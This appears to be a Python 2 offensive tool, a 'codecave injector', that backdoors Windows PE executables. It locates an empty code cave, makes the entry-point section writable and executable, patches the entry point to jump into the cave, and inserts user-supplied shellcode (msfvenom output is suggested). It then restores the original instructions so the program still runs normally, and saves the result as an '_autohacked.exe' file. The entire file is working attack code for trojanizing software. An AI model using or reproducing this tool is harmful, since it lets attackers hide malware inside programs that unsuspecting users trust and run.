#!/usr/bin/python
from capstone import *  # Disassembler
from pefile import *    # PE functions
from keystone import *  # Assembler
import argparse
#import cave_miner as cave_miner

CAVE_SIZE = 1000        # Required size of code cave
BASE_ADDRESS = 0x400000 # Default base address

# Stack alignment commands
PUSHFD = "\x9c"
PUSHAD = "\x60"
POPAD = "\x61"
POPFD = "\x9d"


# ----------------------------------------------------------------------------
# --- Search through PE and return first code cave found with correct size
# ----------------------------------------------------------------------------
def search_for_code_caves(pe, size):
    code_cave = [] # Store code cave data for later

    # Loop through sections and search for code caves
    for section in pe.sections:
        cave = ""
        counter = 0
        data = section.get_data()
        for byte in data:
            if byte == "\x00":
                cave += byte
            else:
                if len(cave) >= CAVE_SIZE:
                    code_cave.append(BASE_ADDRESS + section.VirtualAddress + counter - len(cave))
                    print "Code cave found: "
                    print "\tSection: " + section.Name.decode('utf-8')
                    print "\tSection vAddress: " + hex(BASE_ADDRESS + section.VirtualAddress)
                    code_cave.append(BASE_ADDRESS + section.VirtualAddress)
                    print "\tPointer to Raw Data: " + hex(BASE_ADDRESS + section.PointerToRawData)
                    code_cave.append(BASE_ADDRESS + section.PointerToRawData)
                    print "\tStart Address: " + hex(BASE_ADDRESS + section.VirtualAddress + counter - len(cave))
                    print "\tEnd Address: " + hex(BASE_ADDRESS + section.VirtualAddress + counter)
                    print "\tCave Size: " + hex(len(cave))
                    return code_cave   # We found one so let's quit here
                    break
                cave = ""
            counter = counter + 1

def find_entry_point_section(pe, entry_point):
    # to save section with entry point
    ep_section = ""
    ep_section_counter = 0
    # Loop through section headers and print
    for section in pe.sections:
        if (entry_point >= section.VirtualAddress) and (entry_point <= (section.VirtualAddress + section.Misc_VirtualSize)):
            # Print section info
            print "Entry point is in the following section:"
            print(section.Name.decode('utf-8'))
            print("\tVirtual Address: " + hex(section.VirtualAddress))
            print("\tPointer to Raw Data: " + hex(section.PointerToRawData))
            print("\tVirtual Size: " + hex(section.Misc_VirtualSize))
            print("\tRaw Size: " + hex(section.SizeOfRawData))
            print("\tOriginal Permissions: " + hex(section.Characteristics))
            print ""
            print "Changing section permissions to 0x80000020..."
            pe.sections[ep_section_counter].Characteristics = 0x80000020
            return section
            break
        ep_section_counter += 1


# ---------------------------------------------------------
# --- Returns original instruction at entry point address
# ---------------------------------------------------------

#TODO: Update this code so it just grabs the first X bytes basd on the length of our new jmp_instruction
def get_old_instructions(ep_section, entry_point, base_address, jmp_code):
    # Load the first few instructions starting at the entry point
    # x86 instructions should not usually be longer than 15 bytes
    CODE = ep_section.get_data(start=entry_point, length=len(jmp_code))
    print "old instruction: "
    old_instruction = ""
    for byte in CODE:
        old_instruction += bytes(byte)
        print [byte]

    # Disassemble that section of code and print to screen
    #print "Entry point instructions:"
    #md = Cs(CS_ARCH_X86, CS_MODE_32)
    #counter = 0
    #for i in md.disasm(CODE, base_address + entry_point):
    #    print("0x%x:\t%s\t%s" %(i.address, i.mnemonic, i.op_str))
    #    if counter == 0:
    #        old_instruction = i.bytes
    #    counter += 1

    return old_instruction

def assemble_jmp_code(code_caves, base_address, entry_point):

    jmp_offset = code_caves[0] - (base_address + entry_point)

    # Assemble jump code to get to our code cave
    # separate assembly instructions by ; or \n
    CODE = "JMP " + hex(jmp_offset)

    # Assemble
    try:
        # Initialize engine in X86-32bit mode
        ks = Ks(KS_ARCH_X86, KS_MODE_32)
        encoding, count = ks.asm(CODE)
    except KsError as e:
        print("ERROR: %s" %e)

    # Build string containing new byte codes
    jmp_instruction = b""
    for byte in encoding:
        print hex(byte)
        jmp_instruction += bytes([byte])

    print ""
    print "Return instruction: " + CODE

    # Ensure new byte codes are not longer than old byte codes
    #size_diff =  len(old_instruction) - len(new_instruction)
    #print str(size_diff)

    # If it's shorter, pad with NOPs
    #if size_diff >= 0:
    #    for i in range(0, size_diff):
    #        #new_instruction.append(0x90)
    #        new_instruction += b"\x90"
    #else:
    #    print "Can't replace original instruction!"
    #    print "QUITTING"
    #    exit()
    return jmp_instruction

# Assemble reset code
# - This is executed after our shell code. It overwrites the original entry point instructions with whatever was there before we messed with it.
# - Then we can JMP back to the original entry point again

def build_reset_code(old_instruction, base_address, entry_point):
    CODE = ""
    for byte in reversed(old_instruction):                          # Must reverse due to how the stack works
        CODE += "PUSH " + hex(byte) + ";"                           # PUSH original entry point's opcodes onto stack

    CODE += "MOV ECX, " + hex(len(old_instruction)) + ";"           # Setup loop counter (number of opcodes for original instructions)
    CODE += "MOV EDI, " + hex(base_address + entry_point) + ";"     # Put original entry point address into EDI

    CODE += "loopbegin:;"                                           # Beginning of loop
    CODE += "MOV ESI, ESP;"                                         # Put ESP address into ESI (Address of op codes)
    CODE += "MOVSB;"                              # Copy byte from ESP address to original entry point
    #CODE += "INC EDI;"
    #CODE += "DEC ECX;"
    CODE += "ADD ESP, 0x04;"
    CODE += "loop loopbegin;"
    #CODE += "ADD ESP, 0x04;"                                        # Adjust stack back to where it was before we pushed op codes

    # Assemble
    try:
        # Initialize engine in X86-32bit mode
        ks = Ks(KS_ARCH_X86, KS_MODE_32)
        encoding, count = ks.asm(CODE)
        #print("%s = %s (number of statements: %u)" %(CODE, encoding, count))
    except KsError as e:
        print("ERROR: %s" %e)
    reset_code = ""
    for byte in encoding:
        reset_code += bytes([byte])

    return reset_code

def build_shellcode_1(shellcode_file):
    # Build shellcode
    shellcode = ("\x90" * 8) + PUSHFD + PUSHAD + shellcode_file.read() + ("\x90" * 8)
    return shellcode

def build_shellcode_2(shellcode, entry_point, code_caves, base_address):

    shellcode2 = shellcode + POPAD + POPFD

    # calculate offset to JMP back to entry point after SHELLCODE
    current_location = code_caves[0] - base_address + len(shellcode2)
    CODE = "JMP " + hex(entry_point - current_location) + ";"
    # Assemble
    try:
        # Initialize engine in X86-32bit mode
        ks = Ks(KS_ARCH_X86, KS_MODE_32)
        encoding, count = ks.asm(CODE)
        #print("%s = %s (number of statements: %u)" %(CODE, encoding, count))
    except KsError as e:
        print("ERROR: %s" %e)
    jmp = ""
    for byte in encoding:
        jmp += bytes([byte])

    shellcode2 += jmp
    return shellcode2

def write_new_pe(pe, new_filename, entry_point, ep_section, jmp_instruction, code_caves, shellcode, base_address):
    # Write new entry point instruction to exe
    pe.set_bytes_at_offset(entry_point - (ep_section.VirtualAddress - ep_section.PointerToRawData), jmp_instruction)
    # Write shellcode to exe
    pe.set_bytes_at_offset(code_caves[0] - base_address - (code_caves[1] - code_caves[2]), shellcode)
    pe.write(new_filename + "_autohacked.exe")


# ------------------------------------
# --- Main Loop
# ------------------------------------
def main():
    # Start by obtaining user arguments
    parser = argparse.ArgumentParser(description='Codecave injector')
    parser.add_argument("--pefile", required=True, help="Path to Windows executable PE file to inject")
    parser.add_argument("--shellcode", required=True, help="Path to shellcode binary file, e.g. msfvenom -f raw")
    parser.add_argument("--base_address", required=False, default=BASE_ADDRESS, help="Base address of pe file when executed on target platform")
    args = parser.parse_args()

    # Load file as pe object
    print "Loading pe file..."
    pe = PE(args.pefile)

    print "Loading shellcode file..."
    # Load shellcode from file
    shellcode_file = open(args.shellcode)
    # And create first portion of shellcode
    shellcode = build_shellcode_1(shellcode_file)

    # Grab the exe's entry point virtual offset
    entry_point = pe.OPTIONAL_HEADER.AddressOfEntryPoint
    print "Entry point address: " + hex(entry_point)

    print "Locating entry point section..."
    ep_section = find_entry_point_section(pe, entry_point)

    print "Searching for code caves...\n"
    code_caves = search_for_code_caves(pe, len(shellcode) + 5)
    if not code_caves:
        print "ERROR: No code caves found!"
        exit()

    print "Locating offset from shellcode to entry point..."
    jmp_instruction = assemble_jmp_code(code_caves, args.base_address, entry_point)

    print "Saving original instructions at entry point..."
    old_instruction = get_old_instructions(ep_section, entry_point, args.base_address, jmp_instruction)

    print "Building code to reset entry point to normal..."
    reset_code = build_reset_code(old_instruction, args.base_address, entry_point)
    shellcode += reset_code

    # Finish building shellcode
    shellcode = build_shellcode_2(shellcode, entry_point, code_caves, args.base_address)

    # Create the new, modified exe file
    write_new_pe(pe, args.pefile, entry_point, ep_section, jmp_instruction, code_caves, shellcode, args.base_address)


if __name__ == '__main__':
    main()
